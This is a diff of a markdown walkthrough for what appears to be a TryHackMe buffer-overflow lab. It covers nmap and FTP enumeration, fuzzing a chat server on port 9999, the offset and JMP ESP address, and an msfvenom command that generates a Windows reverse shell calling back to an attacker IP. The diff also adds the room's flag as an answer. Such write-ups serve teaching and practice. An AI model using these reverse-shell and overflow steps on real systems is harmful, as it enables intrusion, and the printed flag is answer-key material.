@@ -6,7 +6,7 @@
 
 * Nmap
 * FTP
-* Phyton
+* Python
 
 ## Task 1 - Deploy Machine and Scan Network
 
@@ -24,7 +24,7 @@ Please note that this machine does not respond to ping (ICMP) and may take a few
 	
 	![task1-nmap](./images/task1-nmap.png)
 
-	We got open port on port 21, 3389 and 9999. FTP allowed to login anonymous. Also we got suspicious open port on 9999. Trying to connect on port 9999.
+	We got open port on port `21`, `3389` and `9999`. FTP allowed to login anonymous. Also we got suspicious open port on `9999`. Trying to connect on port `9999`.
 
 	```
 	nc $IP 9999
@@ -41,8 +41,6 @@ Let's continue with the enumeration!
 ### Answer the questions below
 
 * What is the name of the exe file you found?
-
-	`chatserver.exe`
 
 	* Login FTP to as anonymous
 	
@@ -71,6 +69,8 @@ Let's continue with the enumeration!
 		And now we can see file on directory
 
 		![task2-ftp5](./images/task2-ftp5.png)
+
+	**Answer : chatserver.exe**
 
 ## Task 3 - Access
 
@@ -123,7 +123,7 @@ If you've not done buffer overflows before, check [this](https://tryhackme.com/r
 		import socket, time, sys
 
 		ip = '10.37.1.149'		# Change to IP Host
-		port = 9999				# Change to Port Host
+		port = 9999			# Change to Port Host
 		timeout = 5
 
 		string = "A" * 100
@@ -257,7 +257,7 @@ If you've not done buffer overflows before, check [this](https://tryhackme.com/r
 
 		![task3-ESP](./images/task3-ESP.png)
 
-		We got ESP value = 00A7EEA8
+		We overwrite EIP from 41414141 (string "AAAA") to 42424242 (String "BBBB" on retn variable) and also we got ESP value = 00A7EEA8
 
 	* Use mona to compare bytearray with ESP value
 	
@@ -277,14 +277,14 @@ If you've not done buffer overflows before, check [this](https://tryhackme.com/r
 
 		![task3-jmp](./images/task3-jmp.png)
 
-		Note the address **625014DF** => **62 50 14 DF** => **\xdf\x14\x50\x62** written backwards since the system is little endian
+		Note the address **625014F7** => **62 50 14 F7** => **\xf7\x14\x50\x62** written backwards since the system is little endian
 
 * Since this would work, you can try generate some shellcode - use msfvenom to generate shellcode for windows.
 
 	* Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously
 	
 		```
-		msfvenom -p windows/shell_reverse_tcp LHOST=10.17.127.223 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+		msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.17.127.223 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
 		```
 
 		![task3-msfvenom](./images/task3-msfvenom.png)
@@ -297,5 +297,13 @@ If you've not done buffer overflows before, check [this](https://tryhackme.com/r
 	
 		![task3-listener](./images/task3-listener.png)
 
+	* Run `exploit.py` to get reverse shell
+	
+		![task3-reverse](./images/task3-reverse.png)
+
 * After gaining access, what is the content of the root.txt file?
+
+	![task3-root](./images/task3-root.png)
+
+	**Answer : 5b1001de5a44eca47eee71e7942a8f8a**
 	
